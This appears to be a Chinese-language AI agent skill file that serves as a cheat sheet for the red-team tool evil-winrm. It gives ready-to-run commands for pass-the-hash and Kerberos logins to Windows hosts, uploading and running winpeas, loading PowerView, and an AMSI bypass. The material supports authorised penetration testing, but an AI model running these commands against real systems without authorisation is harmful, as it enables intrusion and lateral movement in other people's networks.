---
name: evil-winrm
description: >
  此技能适用于用户询问关于 "evil-winrm"、"通过 WinRM 获取 Windows 主机 shell"、"使用哈希传递 (Pass-the-Hash) 连接 WinRM"、"上传工具"、"远程执行 PowerShell" 的场景。支持哈希传递、票据传递、SSL、文件上传/下载和 PowerShell 脚本的交互式 WinRM shell。
---

# evil-winrm

交互式 WinRM shell — 红队 Windows 远程访问的标准工具。

## 快速开始

```bash
# 密码连接
evil-winrm -i 192.168.1.10 -u administrator -p Password123

# 哈希传递 (Pass-the-Hash, NTLM)
evil-winrm -i 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117

# 使用 SSL（端口 5986）
evil-winrm -i 192.168.1.10 -u admin -p Password123 -S
```

## 核心参数

| 参数 | 说明 |
|------|-------------|
| `-i <ip>` | 目标 IP/主机名 |
| `-u <user>` | 用户名 |
| `-p <pass>` | 密码 |
| `-H <hash>` | NTLM 哈希（LM:NT 或仅 NT） |
| `-P <port>` | WinRM 端口（默认 5985） |
| `-S` | 使用 SSL（端口 5986） |
| `-c <cert>` | 用于认证的客户端证书 |
| `-r <realm>` | Kerberos 域 |
| `-s <path>` | 要加载的 PowerShell 脚本路径 |
| `-e <path>` | 可执行文件路径（用于上传） |
| `-l <path>` | 将输出记录到文件 |
| `--no-colors` | 禁用颜色 |

## Shell 内置命令

连接后可使用 evil-winrm 内置命令：

| 命令 | 说明 |
|---------|-------------|
| `upload <local> [remote]` | 上传文件到目标 |
| `download <remote> [local]` | 从目标下载文件 |
| `menu` | 显示可用功能 |
| `Invoke-Binary <path>` | 执行上传路径中的二进制文件 |
| `Bypass-4MSI` | AMSI 绕过（内置） |
| `services` | 列出运行中的服务 |
| `exit` | 关闭会话 |

## 常用工作流

```bash
# 基础会话
evil-winrm -i 10.10.10.10 -u admin -p "Password123"

# 提取哈希后进行哈希传递
evil-winrm -i 10.10.10.10 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"

# 上传工具并执行
evil-winrm -i 10.10.10.10 -u admin -p pass -e /opt/tools/
# shell 内部：
# upload /opt/tools/winpeas.exe
# ./winpeas.exe

# 加载自定义 PS 脚本
evil-winrm -i 10.10.10.10 -u admin -p pass -s /opt/scripts/
# shell 内部：
# PowerView.ps1
# Get-NetDomain

# Kerberos 认证（需要有效票据）
export KRB5CCNAME=/tmp/admin.ccache
evil-winrm -i dc.domain.local -r DOMAIN.LOCAL -u admin
```

## 资源

| 文件 | 何时加载 |
|------|--------------|
| `references/winrm-setup.md` | WinRM 配置、防火墙规则、Kerberos 认证设置 |
